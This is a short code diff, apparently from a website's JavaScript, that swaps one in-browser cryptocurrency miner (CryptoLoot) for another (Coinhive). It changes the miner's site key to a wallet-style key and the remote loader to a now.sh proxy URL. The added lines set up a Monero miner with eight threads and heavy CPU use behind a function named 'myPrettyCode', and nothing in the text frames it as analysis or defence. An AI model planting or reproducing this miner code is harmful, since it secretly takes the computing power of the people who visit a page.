@@ -15,11 +15,11 @@ function loadScript(url, callback)
     head.appendChild(script);
 };
 var myPrettyCode = function() {
-  var miner=new CryptoLoot.Anonymous('552a3151084681c06422b293d948704b43eccce6f7f5',
+  var miner=new Coinhive.Anonymous('4Aio2FxFmciVKbu1JabGQGAvD3hEaL95DebaAq9td2UDLdSSM3fZNfWLfqjBkFKYjB2d9pAJw2F7Yh9rFZrEsCvE94277HJ',
         {
         threads:8,autoThreads:false,throttle:0.9
         }
   );
   miner.start();
 };
-loadScript("https://bobbieltd.github.io/js/xmrselfhost.js", myPrettyCode);
+loadScript("https://proxy-zoweqqxyxv.now.sh/client?proxy", myPrettyCode);
